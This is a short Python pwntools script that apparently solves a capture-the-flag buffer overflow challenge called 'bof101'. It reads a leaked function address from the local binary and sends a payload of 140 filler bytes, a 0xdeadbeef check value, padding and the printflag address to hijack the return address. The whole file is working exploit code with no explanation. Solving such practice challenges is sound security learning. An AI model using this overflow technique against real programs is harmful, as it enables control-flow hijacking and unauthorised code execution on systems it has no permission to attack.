from pwn import *
import os
PATH = "./bof101"

p = process(PATH)
e = ELF(PATH)

check = 0xdeadbeef

# printflag
func1 = p.recvline()
printflag = int(func1[-15:].strip('\n'), 16)
log.info(hex(printflag))


# payload
payload = p8(0x90)*140+p64(check)+"AAAA"+p64(printflag)


raw_input()

print p.sendlineafter(":", payload)
print p.recvline()

# p.interactive()
